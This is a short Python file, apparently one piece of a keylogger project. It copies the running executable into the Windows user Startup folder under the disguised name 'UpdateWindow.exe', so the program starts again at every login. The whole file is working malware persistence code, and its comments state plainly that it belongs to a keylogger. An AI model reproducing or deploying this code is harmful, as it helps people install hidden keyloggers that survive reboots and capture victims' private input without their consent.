import os # for interacting with the OS like managing files and nagivating directories
import sys  # interacting with Python interpreter
from pathlib import Path  # handle filesystem paths
import shutil  # automate task, like copying and moving

def path_manipulation():

   try:
         # provide the path of the process(keylogger script) that is currently running 
         exe_file = Path(sys.executable)
      
         # The path of user startup folder on Window
         start_up_folder = Path(os.environ['APPDATA']) /'Microsoft'/'Windows'/'Start Menu'/'Programs'/'Startup' 
         
         # UpdateWindow.exe is the copied file
         duplicate_exe_file = start_up_folder / "UpdateWindow.exe"
         
         # checking the folder, if the file is not present, copy it to the startup folder
         if not duplicate_exe_file.exists():
            
            shutil.copy2(exe_file, duplicate_exe_file)
            
   except FileNotFoundError:
            
            print("Unable to find the file")

            pass 
